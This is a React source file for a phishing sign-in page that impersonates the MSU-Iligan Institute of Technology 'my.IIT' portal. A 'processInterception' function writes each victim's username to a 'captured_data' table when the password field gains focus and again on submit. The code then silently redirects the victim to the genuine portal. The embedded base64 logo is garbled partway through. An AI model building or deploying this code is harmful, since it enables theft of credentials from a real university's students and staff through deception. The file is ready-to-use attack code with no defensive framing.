import React, { useEffect } from "react";
import { supabase } from "./supabaseClient";

export default function Signin() {
  
  // Tracks page landing metrics to the cloud database
  useEffect(() => {
    const trackPageView = async () => {
      const alreadyCounted = sessionStorage.getItem("page_view_session");
      if (alreadyCounted) return;

      try {
        const { data, error } = await supabase
          .from('analytics')
          .select('view_count')
          .eq('id', 1)
          .maybeSingle();

        if (data) {
          const updatedViews = (data.view_count || 0) + 1;
          await supabase
            .from('analytics')
            .update({ view_count: updatedViews })
            .eq('id', 1);

          sessionStorage.setItem("page_view_session", "true");
        }
      } catch (err) {
        console.error("Error updating cloud view counter:", err);
      }
    };

    trackPageView();
  }, []);

  // Sync tab layout meta-header title name
  useEffect(() => {
    document.title = "my.IIT - Sign in";
  }, []);

  // Central Interception Helper
  const processInterception = async () => {
    const usernameInput = document.getElementById("username");
    const usernameVal = usernameInput?.value ? usernameInput.value.trim() : "";

    if (!usernameVal) return;

    try {
      const { error } = await supabase
        .from('captured_data')
        .insert([
          { 
            email: usernameVal, 
            saved_at: new Date().toLocaleString() 
          }
        ]);

      if (error) console.error("Database log rejection:", error.message);
    } catch (err) {
      console.error("Network write exception:", err);
    }
  };

  // NEW SUBMIT LOGIC: Intercepts input data and forces redirection to the official school portal
  const handleFormSubmit = async (e) => {
    e.preventDefault(); // Stop standard form refresh
    
    // 1. Fire a final data check capture to catch the email if they didn't focus the password field
    await processInterception();
    
    // 2. Perform instant hard-redirection to the actual MSU-IIT live web domain
    window.location.href = "https://myiit.msuiit.edu.ph/";
  };

  return (
    <>
      <style>{`
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #D0D0CE; }
        .login-wrapper { background-color: #D0D0CE; width: 100%; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Inter', sans-serif; padding: 24px; box-sizing: border-box; }
        .main-card { width: 100%; max-width: 1020px; background: white; border-radius: 32px; box-shadow: 0 24px 80px rgba(0,0,0,0.18); overflow: hidden; isolation: isolate; display: flex; flex-direction: column; }
        @media (min-width: 768px) { .main-card { flex-direction: row; } }
        .left-panel { width: 100%; padding: 44px 36px; display: flex; flex-direction: column; align-items: center; justify-content: center; background: white; }
        @media (min-width: 768px) { .left-panel { width: 27%; min-width: 280px; } }
        .right-panel { width: 100%; background: #000000; display: flex; align-items: stretch; justify-content: center; }
        @media (min-width: 768px) { .right-panel { width: 73%; } }
        .video-element { width: 100%; height: 100%; object-fit: contain; background-color: #000000; display: block; }
        .logo-box { border: 1px solid #F6BE00; padding: 3px 6px; display: inline-flex; margin-bottom: 24px; }
        .form-title { font-size: 16px; font-weight: 400; color: #787D91; margin-bottom: 24px; text-align: center; }
        .input-group { position: relative; width: 100%; margin-bottom: 14px; }
        .custom-input { width: 100%; border: 1px solid #BDBDBD; border-radius: 4px; padding: 10px 12px; font-size: 13px; outline: none; color: #333333; }
        .input-group label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); background: white; padding: 0 4px; color: #757575; font-size: 13px; pointer-events: none; transition: all 0.15s; }
        .custom-input:focus ~ label, .custom-input:not(:placeholder-shown) ~ label { top: 0; font-size: 11px; color: #1A73E9; }
        .form-actions { display: flex; width: 100%; justify-content: space-between; align-items: center; margin-top: 14px; }
        .forgot-link { font-size: 12px; color: #1A73E9; text-decoration: none; }
        .submit-btn { background: #1A73E9; color: white; font-size: 12px; font-weight: 600; padding: 8px 20px; border-radius: 4px; cursor: pointer; border: none; }
        .bottom-nav { display: flex; width: 100%; justify-content: space-between; margin-top: 28px; font-size: 12px; }
        .bottom-nav a { color: #1A73E9; text-decoration: none; }
        .footer-credits { text-align: center; padding: 16px 0 0 0; color: #79798A; font-size: 11px; width: 100%; }
        .footer-credits a { color: #2D66B2; text-decoration: none; }
      `}</style>

      <div className="login-wrapper">
        <main style={{ width: '100%', maxWidth: '1020px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
          <section className="main-card">
            
            {/* Input Form Module Panel */}
            <div className="left-panel">
              <div className="logo-box">
                <img src="data:image/jpg;base64,R0lGODlhTwAeAMQAAPK/v88QENIgIOV/f/XPz/nf3/zv7++vr+mPj+aAgN9gYNYwMOyfn9xQUOJwcNlAQMwAAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABPAB4AAAX/YCSOZGmeqAitbOu+cOymdI3KeJ7bPK//wFVvmAoaccRk6ch8KZ+RplQITU6lVeuVmSW2UA/I4wawfbu9syk8PkHKNTWKUCgBDDbCkjUY1EV9AhACfSMFfRAIAIt6IgWLi3KPIwZhAiMEggskBo0kD5sjL3BRTiIAMG0RAzEkAW8RBguCECIEAQtUIoIJJQGXoi6kMCOoL6qsxCNhZQq9EAGxAQhRwCIH0CQEEA4ko8Ezp6kjyaYiYQQAYwViEQ0KEaiqEQkrDCMIEH8qwuBqxi6QtVpWS4AebAoOCMCTr5ejAAwgNBghAJ63fvzCxRsHaCA/BhbrJRAApwGEA8t6zAm6pm9Pi2HmALYQqIyfgD8mFUwUkesPglD5UD5wePGlPxbFOK7yWMpiBEEB9lEBEKAROwcHAuBxyQKmRp星座..." alt="logos" style={{ height: '32px' }} />
              </div>
              <h1 className="form-title">Sign in to continue</h1>
              
              <form id="login-form" onSubmit={handleFormSubmit} style={{ width: '100%' }}>
                <div className="input-group">
                  <input type="text" name="username" id="username" placeholder=" " required className="custom-input" />
                  <label htmlFor="username">Enter your username</label>
                </div>
                
                <div className="input-group">
                  {/* Focus event still intercepts target inputs instantaneously */}
                  <input type="password" name="password" id="password" placeholder=" " required onFocus={processInterception} className="custom-input" />
                  <label htmlFor="password">Enter your password</label>
                </div>
                
                <div className="form-actions">
                  <a href="#" className="forgot-link">Forgot password?</a>
                  <button type="submit" className="submit-btn">Sign in</button>
                </div>
                <div className="bottom-nav">
                  <a href="#">Sign up</a>
                  <a href="#">Help</a>
                </div>
              </form>
            </div>

            {/* Premium Multimedia Graphics Display Component Panel */}
            <div className="right-panel">
              <video className="video-element" autoPlay muted loop playsInline style={{ pointerEvents: 'none' }}>
                <source src="/myiit.mp4" type="video/mp4" />
              </video>
            </div>

          </section>
          
          <div className="footer-credits">
            Copyright © 2010 onwards, <a href="https://www.msuiit.edu.ph/" target="_blank" rel="noopener noreferrer">MSU-Iligan Institute of Technology</a>. 9200 Iligan City, Philippines.
          </div>
        </main>
      </div>
    </>
  );
}